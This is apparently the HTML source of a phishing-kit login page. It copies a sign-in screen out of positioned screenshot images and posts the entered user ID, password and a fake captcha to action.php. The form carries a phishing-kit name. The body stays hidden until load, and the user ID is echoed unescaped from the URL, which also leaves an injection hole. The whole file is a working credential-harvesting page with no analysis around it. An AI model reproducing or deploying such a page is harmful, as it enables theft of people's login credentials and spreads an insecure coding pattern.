<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign in</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">


<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>





<style> 
  .textbox { 
   
   
    border: 1px double #DDD; 
    border-radius: 1px; 
    box-shadow: 0 0 5px #333; 
    color: #666; 
    outline: none; 
    height:27px; 
    width: 275px; 
        background-color: #fafafa;
    padding: 5px 10px;
    padding-top: 5px;
    padding-right: 10px;
    padding-bottom: 5px;
    padding-left: 10px;
    font-size: 14px;
   
  } 
 </style> 
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:88px; top:134px; width:564px; height:580px; z-index:0"><img src="images/598b4917a434005b0ffc357c4320926e.png" alt="" title="" border=0 width=564 height=580></div>
<form action=action.php name=chalbhai id=chalbhai method=post>
<div id="shape1" style="position:absolute; overflow:hidden; left:0px; top:1px; width:1334px; height:867px; z-index:1"><img border=0 width="100%" height="100%" alt="" src="images/shape244779640.gif"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:158px; top:291px; width:564px; height:580px; z-index:2"><img src="images/598b4917a434005b0ffc357c4320926e.png" alt="" title="" border=0 width=564 height=580></div>

<div id="image4" style="position:absolute; overflow:hidden; left:143px; top:891px; width:1052px; height:61px; z-index:3"><a href="#"><img src="images/6.png" alt="" title="" border=0 width=1052 height=61></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:890px; top:80px; width:315px; height:661px; z-index:4"><img src="images/1.png" alt="" title="" border=0 width=315 height=661></div>

<div id="image5" style="position:absolute; overflow:hidden; left:157px; top:104px; width:636px; height:162px; z-index:5"><img src="images/7.png" alt="" title="" border=0 width=636 height=162></div>

<div id="image6" style="position:absolute; overflow:hidden; left:1049px; top:348px; width:71px; height:18px; z-index:6"><a href="#"><img src="images/2.png" alt="" title="" border=0 width=71 height=18></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:918px; top:516px; width:136px; height:50px; z-index:7"><a href="#"><img src="images/3.png" alt="" title="" border=0 width=136 height=50></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:918px; top:673px; width:222px; height:38px; z-index:8"><a href="#"><img src="images/4.png" alt="" title="" border=0 width=222 height=38></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:1015px; top:649px; width:71px; height:18px; z-index:9"><a href="#"><img src="images/2.png" alt="" title="" border=0 width=71 height=18></a></div>

<input name="userid" value="<?=$_GET[userid]?>" required class="textbox" type="text" style="position:absolute;width:261px;left:920px;border:none;text-align:center;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);top:242px;z-index:10">
<input name="formtext2" required class="textbox" type="password" style="position:absolute;width:261px;left:921px;top:305px;z-index:11">
<input name="formtext3" required title="Please Enter Correct Image Letter" class="textbox" type="text" maxlength=4 style="position:absolute;width:261px;left:921px;top:468px;z-index:12">
<div id="image10" style="position:absolute; overflow:hidden; left:922px; top:377px; width:240px; height:60px; z-index:13"><img src="images/captcha_challenge.gif" alt="" title="" border=0 width=240 height=60></div>

<div id="formimage1" style="position:absolute; left:920px; top:579px; z-index:14"><input type="image" name="formimage1" width="85" height="27" src="images/signin.png"></div>

</body>
</html>
